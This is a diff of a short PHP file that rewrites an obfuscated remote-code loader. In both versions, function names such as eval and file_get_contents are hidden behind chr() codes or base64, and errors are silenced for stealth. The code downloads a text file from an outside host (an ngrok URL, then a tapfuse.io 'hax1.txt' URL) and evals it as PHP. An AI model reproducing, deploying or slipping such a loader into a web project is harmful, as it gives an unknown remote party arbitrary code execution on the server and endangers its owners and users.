@@ -1,27 +1,30 @@
 <?php
-error_reporting(0); // Sembunyikan error (opsional, untuk stealth)
+error_reporting(0);
+@ini_set('display_errors',0);
 
-function x($c){return chr($c);}
-$p = strrev(x(100).x(97).x(116).x(97).x(99).x(111).x(109).x(109).x(97).x(110).x(100));
-$h = x(104).x(116).x(116).x(112).x(115).x(58).x(47).x(47).x(121).x(111).x(117).x(114).x(115).x(101).x(114).x(118).x(101).x(114).x(46).x(110).x(103).x(114).x(111).x(107).x(46).x(105).x(111).x(47).x(112).x(97).x(121).x(108).x(111).x(97).x(100).x(46).x(116).x(120).x(116);
+function c($a){return chr($a);}
 
-$g = base64_decode('ZmlsZV9nZXRfY29udGVudHM='); // file_get_contents
-$e = 'ZXZhbA=='; // eval
-$u = 'dXJsZGVjb2Rl'; // urldecode
+// === file_get_contents ===
+$f = c(102).c(105).c(108).c(101).c(95).c(103).c(101).c(116).c(95).c(99).c(111).c(110).c(116).c(101).c(110).c(116).c(115);
 
-$q = base64_decode($e); // eval
-$w = base64_decode($u); // urldecode
+// === urldecode ===
+$u = c(117).c(114).c(108).c(100).c(101).c(99).c(111).c(100).c(101);
 
-// Ambil konten dari URL
-$content = @$g($h); // @ untuk suppress warning
+// === eval ===
+$e = c(101).c(118).c(97).c(108);
 
-if ($content !== false && !empty($content)) {
-    // Decode ?%3f%3e → ?>, lalu gabungkan dengan konten
-    $payload = $w('%3f%3e') . $content;
-    // Eksekusi
-    @$q($payload);
-} else {
-    // Fallback jika gagal ambil file
-    echo "Failed to load payload.";
+// === URL: https://www.tapfuse.io/raw/hax1.txt ===
+$url = c(104).c(116).c(116).c(112).c(115).c(58).c(47).c(47).
+       c(119).c(119).c(119).c(46).c(116).c(97).c(112).c(102).c(117).c(115).c(101).c(46).
+       c(105).c(111).c(47).c(114).c(97).c(119).c(47).c(104).c(97).c(120).c(49).c(46).
+       c(116).c(120).c(116);
+
+// === ?%3f%3e → ?> ===
+$close = c(37).c(51).c(102).c(37).c(51).c(101); // %3f%3e
+
+// === EKSEKUSI ===
+$content = @$f($url);
+if($content !== false && $content !== ''){
+    @$e($u($close) . $content);
 }
 ?>
